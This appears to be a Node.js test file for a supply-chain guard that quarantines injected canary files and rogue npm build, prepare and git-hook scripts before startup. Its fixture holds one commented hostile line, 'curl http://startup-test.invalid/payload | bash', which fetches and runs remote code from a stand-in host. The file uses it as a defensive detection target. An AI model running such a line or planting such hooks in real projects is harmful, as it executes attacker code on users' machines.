'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');
const { startupEnvironment } = require('../../src/utils/canaryStartup');
const CLI = path.resolve(__dirname, '../../bin/npa.js');
const original = '// intentional inert canary; never execute\n';
const introduced = '// inert changed canary; never execute\n// curl http://startup-test.invalid/payload | bash\n';
const hash = text => crypto.createHash('sha256').update(text).digest('hex');
const entry = `const fs=require('fs');const state={canaryPresent:fs.existsSync('canary.js'),scripts:JSON.parse(fs.readFileSync('package.json','utf8')).scripts};fs.writeFileSync('entry-observation.json',JSON.stringify(state));console.log(JSON.stringify(state));`;

module.exports = (async () => {
  const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-startup-live-'));
  const observations = [];
  const baseEnv = { ...process.env, HOME: parent, USERPROFILE: parent, NODE_OPTIONS: '', NPA_CANARY_GUARD: '', NO_COLOR: '1',
    npm_config_offline: 'true', npm_config_ignore_scripts: 'true', npm_config_audit: 'false', npm_config_fund: 'false' };
  function fixture(name, { trusted = false, clean = false, denied = false } = {}) {
    const root = path.join(parent, name);
    fs.mkdirSync(path.join(root, '.git/hooks'), { recursive: true });
    fs.writeFileSync(path.join(root, '.git/config'), '[core]\n');
    fs.writeFileSync(path.join(root, '.git/hooks/pre-commit'), clean ? 'echo preserved\n' : 'node canary.js\necho preserved\n');
    fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name: 'npa-startup-live', version: '1.0.0', private: true,
      scripts: clean ? { build: 'tsc' } : { build: 'node canary.js && tsc', prepare: 'node canary.js' } }));
    fs.writeFileSync(path.join(root, '.npmauditor.json'), JSON.stringify({ canaryProtection: true, silent: true,
      canaryTrustedFiles: trusted ? [{ path: 'canary.js', sha256: hash(original) }] : [] }));
    if (!clean) fs.writeFileSync(path.join(root, 'canary.js'), trusted ? original : introduced);
    if (denied) fs.mkdirSync(path.join(root, '.gitignore'));
    return root;
  }
  function run(kind, root, code = entry, env = startupEnvironment(baseEnv, root)) {
    const result = spawnSync(process.execPath, ['-e', code], { cwd: root, env, encoding: 'utf8', timeout: 15000 });
    assert.ifError(result.error);
    const marker = path.join(root, 'entry-observation.json');
    const record = { kind, root, nodeExecutable: process.execPath, exit: result.status, stdout: result.stdout, stderr: result.stderr,
      entryRan: fs.existsSync(marker), entryObservation: fs.existsSync(marker) ? JSON.parse(fs.readFileSync(marker, 'utf8')) : null,
      canaryPresent: fs.existsSync(path.join(root, 'canary.js')), scripts: JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8')).scripts };
    observations.push(record);
    return record;
  }
  try {
    let root = fixture('before-entry');
    let result = run('protection-before-inline-entry', root);
    assert.strictEqual(result.exit, 0, result.stderr);
    assert.strictEqual(result.entryRan, true);
    assert.deepStrictEqual(result.entryObservation, { canaryPresent: false, scripts: { build: 'tsc' } });
    assert.match(result.stderr, /Canary startup protection: 1 files quarantined/);

    root = fixture('failed-protection', { denied: true });
    result = run('failure-blocks-inline-entry', root);
    assert.strictEqual(result.exit, 2);
    assert.strictEqual(result.entryRan, false, 'Failed protection must stop before the harmless entrypoint writes its marker');
    assert.strictEqual(result.canaryPresent, true);
    assert.match(result.stderr, /Canary startup blocked/);

    root = fixture('approved', { trusted: true });
    result = run('trusted-canary-preserved-before-entry', root);
    assert.strictEqual(result.exit, 0, result.stderr);
    assert.strictEqual(result.entryObservation.canaryPresent, true);
    assert.deepStrictEqual(result.scripts, { build: 'node canary.js && tsc', prepare: 'node canary.js' });
    assert.strictEqual(hash(fs.readFileSync(path.join(root, 'canary.js'))), hash(original));
    assert.ok(!fs.existsSync(path.join(root, '.gitignore')));

    root = fixture('approved-then-changed', { trusted: true });
    fs.writeFileSync(path.join(root, 'canary.js'), introduced);
    result = run('changed-trust-quarantined-before-entry', root);
    assert.strictEqual(result.exit, 0, result.stderr);
    assert.strictEqual(result.entryObservation.canaryPresent, false);

    root = fixture('inherited-child', { clean: true });
    const parentCode = `const fs=require('fs'),cp=require('child_process');fs.writeFileSync('canary.js',${JSON.stringify(introduced)});const manifest=JSON.parse(fs.readFileSync('package.json','utf8'));manifest.scripts={build:'node canary.js && tsc',prepare:'node canary.js'};fs.writeFileSync('package.json',JSON.stringify(manifest));const child=cp.spawnSync(process.execPath,['-e',${JSON.stringify(entry)}],{encoding:'utf8'});console.log(JSON.stringify({childExit:child.status,childStdout:child.stdout,childStderr:child.stderr}));process.exitCode=child.status;`;
    result = run('inherited-child-catches-later-file', root, parentCode);
    assert.strictEqual(result.exit, 0, result.stderr);
    const child = JSON.parse(result.stdout);
    assert.strictEqual(child.childExit, 0);
    assert.match(child.childStderr, /Canary startup protection/);
    assert.strictEqual(result.entryObservation.canaryPresent, false);

    root = fixture('existing-preload');
    // This is trusted test-harness code outside the scanned roots, not a fixture target.
    const extra = path.join(parent, 'additional preload.js');
    fs.writeFileSync(extra, "const fs=require('fs');if(fs.existsSync('canary.js'))throw new Error('Guard must run first');fs.writeFileSync('additional-preload-marker','ran after protection');\n");
    const env = startupEnvironment({ ...baseEnv, NODE_OPTIONS: '--require ' + JSON.stringify(extra.split(path.sep).join('/')) }, root);
    result = run('guard-precedes-existing-preload', root, entry, env);
    assert.strictEqual(result.exit, 0, result.stderr);
    assert.ok(fs.existsSync(path.join(root, 'additional-preload-marker')));
    assert.strictEqual(result.entryObservation.canaryPresent, false);

    root = fixture('invalid-settings', { clean: true });
    const invalidEnv = startupEnvironment(baseEnv, root);
    invalidEnv.NPA_CANARY_GUARD = 'invalid JSON';
    result = run('invalid-settings-block-entry', root, entry, invalidEnv);
    assert.strictEqual(result.exit, 2);
    assert.strictEqual(result.entryRan, false);

    root = fixture('session-settings');
    const setup = spawnSync(process.execPath, [CLI, 'canary-guard', root, '--json'], { cwd: root, env: baseEnv, encoding: 'utf8', timeout: 15000 });
    assert.strictEqual(setup.status, 0, setup.stderr);
    assert.ok(fs.existsSync(path.join(root, 'canary.js')), 'Printing session settings must not mutate scanned files');
    const settings = JSON.parse(setup.stdout);
    assert.strictEqual(settings.setup.length, 2);
    assert.deepStrictEqual(JSON.parse(settings.env.NPA_CANARY_GUARD).roots, [root]);
    result = run('generated-session-settings-work', root, entry, { ...baseEnv, ...settings.env });
    assert.strictEqual(result.exit, 0, result.stderr);
    assert.strictEqual(result.entryObservation.canaryPresent, false);

    root = fixture('native-late-introduction', { clean: true });
    const bootstrap = path.join(parent, 'native-timing-harness.js');
    // Inject an inert file after npa's preflight, then forward the real npm launch.
    fs.writeFileSync(bootstrap, `const fs=require('fs'),cp=require('child_process');const actual=cp.spawnSync;cp.spawnSync=(cmd,args,opts)=>{fs.writeFileSync('canary.js',${JSON.stringify(introduced)});const pkg=JSON.parse(fs.readFileSync('package.json','utf8'));pkg.scripts={build:'node canary.js && tsc',prepare:'node canary.js'};fs.writeFileSync('package.json',JSON.stringify(pkg));return actual(cmd,args,opts);};process.argv=[process.execPath,${JSON.stringify(CLI)},'prefix'];require(${JSON.stringify(CLI)});`);
    const native = spawnSync(process.execPath, [bootstrap], { cwd: root, env: baseEnv, encoding: 'utf8', timeout: 15000 });
    assert.ifError(native.error);
    assert.strictEqual(native.status, 0, native.stderr);
    assert.ok(native.stdout.trim().split(/\r?\n/).includes(root), 'Actual npm prefix must run');
    assert.match(native.stderr, /Canary startup protection: 1 files quarantined/);
    assert.ok(!fs.existsSync(path.join(root, 'canary.js')));
    assert.deepStrictEqual(JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8')).scripts, { build: 'tsc' });
    observations.push({ kind: 'native-npm-startup-catches-post-preflight-file', root, exit: native.status, stdout: native.stdout, stderr: native.stderr,
      method: 'Timing injection wrapper forwarded the genuine npm spawn; the scanner and npm result were not substituted.', canaryPresent: false });
    console.log('  live Node startup guard: pre-entry checks, failure blocking, exact trust, inherited child checks, preload ordering, session setup and real native npm late-file protection passed (no scanned scripts executed)');
    return observations;
  } finally { fs.rmSync(parent, { recursive: true, force: true }); }
})();
